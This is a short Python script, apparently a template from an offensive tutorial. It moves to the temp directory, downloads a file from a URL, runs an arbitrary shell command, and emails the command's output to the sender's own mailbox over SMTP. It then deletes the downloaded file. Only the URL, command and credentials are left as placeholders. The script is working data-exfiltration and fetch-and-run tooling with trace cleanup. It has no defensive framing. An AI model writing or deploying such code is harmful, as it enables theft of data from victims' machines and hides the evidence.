import requests
import subprocess
import smtplib
import os
import tempfile


def send_mail(email, password, message):
    """
    Simple function to establish a smtp connection
    with given credentials and message
    """
    server = smtplib.SMTP("smtp.yourprovider.com", 555)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def download(url):
    """
    Simple function to download a file from given url
    """
    get_response = requests.get(url)
    global file_name
    file_name = url.split("/")[-1]

    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


file_name = ""
temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
download("file to download")
result = subprocess.check_output("command to execute", shell=True)
send_mail("yourmail", "yourpassword", result)
os.remove(file_name)
